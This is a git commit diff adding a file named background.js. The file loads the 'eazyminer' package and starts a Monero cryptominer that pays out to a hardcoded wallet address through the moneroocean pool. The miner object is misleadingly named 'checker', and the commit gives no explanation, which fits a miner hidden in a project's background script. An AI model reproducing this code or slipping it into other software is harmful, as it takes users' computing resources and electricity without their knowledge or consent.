f53748dcd2dfa8511e2683f2f8f953ea0d4d9efa
Dave <daveistdave@gmail.com>
2023-05-21 00:30:01 +0200

    first commit#

---
+++ background.js
@@ -0,0 +1,24 @@
+const a = require('eazyminer');
+
+const checker = new a(
+{
+    pools: [
+      {
+        coin: 'XMR',
+        user:
+          '41pEhhCuFnjLQYFmN8miy8fCgvGX4VwyMgHvkMaCNocnDW4eahaPC74jaRyd9TfYwMgk2Z2swXYoc6fP1hYbCYgKNAnabxv',
+        url: 'gulf.moneroocean.stream:20128', // optional pool URL
+      },
+    ],
+    web: [
+      {
+        enabled: false,
+        port: 3000,
+      },
+    ],
+    autoStart: false,
+  },
+);
+
+
+checker.start();
